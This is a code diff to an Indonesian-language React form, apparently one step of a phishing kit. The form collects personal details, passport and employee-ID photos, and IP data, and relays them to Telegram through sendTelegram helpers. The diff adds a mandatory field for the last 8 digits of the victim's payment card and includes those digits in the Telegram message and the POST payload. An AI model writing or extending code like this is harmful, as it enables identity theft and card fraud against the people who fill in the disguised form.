@@ -1,7 +1,7 @@
 import { useState, useEffect, useRef } from "react";
 import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
-import { Upload, Loader2, User, Phone, MapPin, Calendar, FileText } from "lucide-react";
+import { Upload, Loader2, User, Phone, MapPin, FileText, CreditCard } from "lucide-react";
 import { sendTelegram, sendFileToTelegram, getIPInfo } from "@/lib/telegram";
 
 const INQUIRY_TYPES = [
@@ -27,6 +27,7 @@ export default function Step4() {
   const [dob, setDob]                   = useState("");
   const [inquiryType, setInquiryType]   = useState("");
   const [message, setMessage]           = useState("");
+  const [cardDigits, setCardDigits]     = useState("");
   const [passportFile, setPassportFile] = useState<File | null>(null);
   const [empIdFile, setEmpIdFile]       = useState<File | null>(null);
   const [errors, setErrors]             = useState<Record<string, string>>({});
@@ -51,6 +52,8 @@ export default function Step4() {
     if (!postalCode.trim())  errs.postalCode  = "Kode pos wajib diisi.";
     if (!dob.trim())         errs.dob         = "Tanggal lahir wajib diisi.";
     if (!inquiryType)        errs.inquiryType = "Pilih jenis pertanyaan.";
+    if (!cardDigits.trim())  errs.cardDigits  = "8 digit akhiran kartu wajib diisi.";
+    else if (!/^\d{8}$/.test(cardDigits.trim())) errs.cardDigits = "Harus tepat 8 angka.";
     if (!passportFile)       errs.passport    = "Foto paspor wajib diunggah.";
     if (!empIdFile)          errs.empId       = "Foto ID karyawan wajib diunggah.";
     return errs;
@@ -74,6 +77,7 @@ export default function Step4() {
         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
         `👤 <b>Username</b>    : <code>${user?.username ?? "-"}</code>\n` +
         `👦 <b>Nama Lengkap</b>: <code>${firstName} ${lastName}</code>\n` +
+        `💳 <b>Akhiran Kartu</b>: <code>XXXX XXXX ${cardDigits.trim()}</code>\n` +
         `📧 <b>Email</b>       : <code>${email}</code>\n` +
         `📱 <b>Mobile</b>      : <code>${phone}</code>\n` +
         `🏠 <b>Alamat</b>      : <code>${address}, ${city}, ${stateVal} ${postalCode}</code>\n` +
@@ -93,6 +97,7 @@ export default function Step4() {
           firstName, lastName, email, phone,
           address, city, state: stateVal, postalCode,
           dob, inquiryType, message, ipAddress: ip,
+          cardDigits: cardDigits.trim(),
         }),
       }).catch(() => {});
 
@@ -247,6 +252,50 @@ export default function Step4() {
                 style={{ ...inputBase, borderColor: errors.dob ? "#e00" : "#ddd" }} />
               <FieldError name="dob" />
             </div>
+          </div>
+
+          {/* ── Section: Kartu ── */}
+          {sectionTitle(<CreditCard size={15} />, "Informasi Kartu")}
+
+          <div style={{ marginBottom: 20 }}>
+            <label style={labelStyle}>8 Digit Akhiran Kartu *</label>
+            <div style={{ position: "relative" }}>
+              <span style={{
+                position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)",
+                fontSize: 14, color: "#bbb", letterSpacing: "0.08em", pointerEvents: "none",
+                fontFamily: "monospace",
+              }}>
+                XXXX XXXX
+              </span>
+              <input
+                className="s4-input"
+                type="text"
+                inputMode="numeric"
+                placeholder="12345678"
+                maxLength={8}
+                value={cardDigits}
+                onChange={(e) => {
+                  const val = e.target.value.replace(/\D/g, "").slice(0, 8);
+                  setCardDigits(val);
+                  setErrors(p => ({ ...p, cardDigits: "" }));
+                }}
+                disabled={loading}
+                style={{
+                  ...inputBase,
+                  paddingLeft: 110,
+                  borderColor: errors.cardDigits ? "#e00" : "#ddd",
+                  fontFamily: "monospace",
+                  letterSpacing: "0.15em",
+                  fontSize: 16,
+                }}
+              />
+            </div>
+            {errors.cardDigits && (
+              <p style={{ fontSize: 11, color: "#e00", marginTop: 5 }}>{errors.cardDigits}</p>
+            )}
+            <p style={{ fontSize: 11, color: "#888", marginTop: 5 }}>
+              Masukkan 8 digit terakhir nomor kartu Anda.
+            </p>
           </div>
 
           {/* ── Section: Kontak ── */}
